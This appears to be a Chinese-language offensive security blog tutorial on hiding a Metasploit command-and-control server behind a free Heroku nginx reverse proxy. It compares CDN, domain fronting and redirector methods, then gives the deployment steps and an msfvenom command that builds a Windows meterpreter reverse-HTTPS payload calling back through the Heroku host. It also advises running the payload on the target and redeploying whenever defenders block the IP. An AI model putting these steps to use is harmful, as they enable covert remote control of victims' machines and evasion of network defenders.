# 利用heroku隐藏C2服务器(简单/零成本)

# 前言
本篇文章介绍如何使用heroku实现隐藏metasploit-framework的C2服务,相比较于业界流行的 `域前置` `CDN` `重定向` 三种隐藏C2的方法,本篇文章介绍的方法操作简单,在与 `威胁情报` 和 `IP封锁` 对抗过程成本更低(无论是时间成本还是资金成本).

# 当前流行的隐藏C2技术
`域前置` `CDN` `重定向`[ ](https://me.csdn.net/qq_41874930)是当前流行的三种隐藏C2的技术. Shanfenglan7 在其文章 [利用CDN、域前置、重定向三种技术隐藏C2的区别](https://blog.csdn.net/qq_41874930/article/details/109008708) 中进行了非常细致的说明,笔者在实际测试三种技术发现,每种技术都有一些不足.

## CDN隐藏C2
使用CDN隐藏C2的准备工作大致如下

+ 需要购买域名 (可以通过[https://www.freenom.com/](https://www.freenom.com/)使用免费的)
+ 需要购买CDN服务 (可以使用免费的[https://www.cloudflare.com/](https://www.cloudflare.com/))
+ 需要在CDN服务商处修改DNS记录
+ 需要等待DNS记录生效(如果你的域名绑定过其他IP,这个操作需要几个小时)

可以看到,虽然通过组合免费服务可以实现零成本,但是实现过程中需要进行很多配置操作,时间成本及心智成本过高.如果域名不是匿名注册,还有被追踪溯源的风险.

## 域前置隐藏C2
使用域前置隐藏C2的准备工作大致如下

+ 需要购买域名 (可以通过[https://www.freenom.com/](https://www.freenom.com/)使用免费的)
+ 需要购买CDN服务 (可以使用免费的[https://www.cloudflare.com/](https://www.cloudflare.com/))
+ 需要在CDN服务商处修改DNS记录
+ 需要等待DNS记录生效(如果你的域名绑定过其他IP,这个操作需要几个小时)
+ 需要知道cdn上的其他高信誉域名或者ip
+ 需要修改malleable profile文件

域前置相对于CDN还要进行更多的额外操作,而且当前主流CDN服务商都已经开始屏蔽域前置技术.

## 重定向隐藏C2
使用重定向隐藏C2的准备工作大致如下

+ 需要两台VPS
+ 使用apache或者nginx配置重定向转发
+ 需要修改malleable profile文件

重定向需要进行一些额外的编码及部署工作,而且还需要将一台VPS的IP地址暴露给 威胁情报 ,可能被溯源,其实并没有实现隐藏C2的目标.

# 利用heroku隐藏C2服务器
Heroku是一个支持多种编程语言的云平台即服务。简单理解就是可以免费部署docker容器并且可以开放web服务到互联网.下面介绍操作步骤.

+ 首先注册Heroku账号，点击通过 [https://dashboard.heroku.com](https://dashboard.heroku.com/) 注册一个账号 (推荐使用gmail)
+ 注册成功以后登录，登录以后点击 [部署链接](https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku),
+ app名称填写为 `mydiydomain` (可自定义,名称为后续域名前缀)，TARGET环境变量填写为C2的handler地址

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\1.webp)

+ 然后点击 Deploy app 系统会自动部署.
+ 在metasploit-framework中添加handler,配置如图

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\2.webp)![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\3.webp)



+ 执行 `to_handler` 生成listener
+ 使用如下命令生成payload

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=mydiydomain.herokuapp.com LPORT=443 -f exe -o ~/payload.exe
```

+ 上传运行目标机器运行即可

# 运行效果
+ 在metasploit-framework中查看session如下,可以看到session的链接地址为heroku中转服务器地址

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\4.webp)

+ 在目标机抓包效果如下

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\5.webp)

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\6.webp)

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\7.webp)

# 总结
heroku隐藏C2从技术原理上看非常简单,使用heroku服务部署nginx反向代理服务,payload连接heroku的nginx,nginx将流量转发到C2.具体优势如下:

+ 只需要注册heroku免费账号即可
+ 无需注册或购买域名
+ 自带可信的SSL证书(heroku域名自带证书)
+ 如果IP地址被封锁,可删除原有heroku app重新部署heroku app(大约需要30s),与防守人员持续对抗
+ 操作步骤简单



